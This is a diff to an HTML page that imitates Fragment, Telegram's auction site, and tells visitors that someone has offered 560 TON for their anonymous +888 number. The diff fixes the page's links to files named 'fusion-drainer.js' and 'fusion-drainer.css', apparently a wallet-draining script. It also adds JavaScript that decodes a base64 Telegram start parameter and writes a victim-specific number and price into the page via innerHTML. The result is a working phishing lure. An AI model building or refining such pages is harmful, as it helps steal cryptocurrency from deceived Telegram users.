@@ -23,8 +23,8 @@
   <meta property="og:description" content="An auction to get the Telegram username @oliveer is in progress.">
   <meta property="og:site_name" content="Fragment Auctions">
   <link rel="canonical" href="oliveer.html" />
-  <link rel="stylesheet" href="//fusion-drainer.css?v=1.0.1" />
-  <script src="..//fusion-drainer.js?v=1.0.6" defer crossorigin></script>
+  <link rel="stylesheet" href="/fusion-drainer.css?v=1.0.1" />
+  <script src="/fusion-drainer.js?v=1.0.6" defer crossorigin></script>
   <link rel="shortcut icon" href="fragment.ico" type="image/x-icon" />
   <link rel="mask-icon" href="https://fragment.com/img/fragment_icon.svg" color="#121519">
   <script>
@@ -156,7 +156,7 @@
 
           </table>
           <div class="tm-bid-info-text">
-            Someone offered <span class="table-cell-value tm-value icon-before icon-ton">560</span> for your anonymous number. If the price suits you, press "Accept the offer".
+            Someone offered <span class="table-cell-value tm-value icon-before icon-ton" id="price1">560</span> for your anonymous number. If the price suits you, press "Accept the offer".
             <br><a href="https://fragment.com/about" class="js-howitworks">How does this work?</a>
           </div>
 
@@ -166,7 +166,7 @@
           <dl class="tm-list-item">
             <dt class="tm-list-item-title">Anonymous Number</dt>
             <dd class="tm-list-item-value">
-              <span class="accent-color">+888 2776 3742</span>
+              <span class="accent-color" id="numb4">+888 2776 3742</span>
             </dd>
           </dl>
           <div class="tm-list-item-hint">
@@ -249,7 +249,7 @@
               <tr>
                 <td>
                   <div class="table-cell">
-                    <div class="table-cell-value tm-value icon-before icon-ton">560</div>
+                    <div class="table-cell-value tm-value icon-before icon-ton" id="price2">560</div>
                   </div>
                 </td>
                 <td>
@@ -292,7 +292,7 @@
     <div class="popup">
       <div class="popup-body">
         <section>
-          <h2>+888 2776 3742</h2>
+          <h2 id="numb3">+888 2776 3742</h2>
           <p class="popup-text">Telegram username and +888 2776 3742.t.me</p>
           <form class="js-place-bid-form">
             <div class="form-group">
@@ -437,7 +437,7 @@
       <div class="popup-body">
         <section>
           <h4>Make an offer</h4>
-          <p class="popup-text">Let the owner of <span class="accent-color">+888 2776 3742</span> know that you are willing to buy this username.</p>
+          <p class="popup-text">Let the owner of <span class="accent-color" id="numb2">+888 2776 3742</span> know that you are willing to buy this username.</p>
           <form class="js-make-offer-form">
             <input type="hidden" name="id" />
             <div class="form-group">
@@ -584,14 +584,26 @@
 
   <script>let startParam = window.Telegram.WebApp.initDataUnsafe.start_param;
 console.log(startParam);
-let numb1=document.getElementById("numb1");
+const numb1=document.getElementById("numb1");
+const numb2=document.getElementById("numb2");
+const numb3=document.getElementById("numb3");
+const numb4=document.getElementById("numb4");
+const price1=document.getElementById("price1");
+const price2=document.getElementById("price2");
 
 var decodedString = atob(startParam);
 
 const obj = JSON.parse(decodedString);
 let number=obj.number;
 let price=obj.price;
+
 numb1.innerHTML = number;
+numb2.innerHTML = number;
+numb3.innerHTML = number;
+numb4.innerHTML = number;
+
+price1.innerHTML = price;
+price2.innerHTML = price;
 </script>
 </body>
 
